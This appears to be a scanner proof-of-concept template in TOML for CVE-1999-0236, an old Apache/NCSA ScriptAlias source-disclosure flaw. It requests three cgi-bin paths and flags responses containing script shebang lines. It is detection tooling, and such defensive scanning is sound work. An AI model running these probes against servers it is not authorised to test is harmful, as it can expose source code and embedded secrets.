[info]
author = "ave"
description = "通过访问 ScriptAlias 目录下的 CGI 文件，检测服务器是否返回 CGI 脚本源代码而非执行。若响应包含脚本语言特征（如 #!/usr/bin/perl、#!/bin/sh 等），则表明存在源码泄露漏洞。"
id = "POC-AVE-1999-0421"
name = "NCSA/Apache httpd ScriptAlias 源代码泄露漏洞 PoC"
severity = "high"
tags = ["ave-1999-0421"]
vuln_id = [
    "CVE-1999-0236",
    "AVE-1999-0421",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/test.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "#!/usr",
    "#!/bin/sh",
    "#!/bin/bash",
    "Content-Type: text/html",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/printenv"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "#!/usr",
    "#!/bin/sh",
    "#!/bin/bash",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/test.pl"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "#!/usr",
    "use CGI",
    "#!/bin/sh",
    "#!/bin/bash",
]
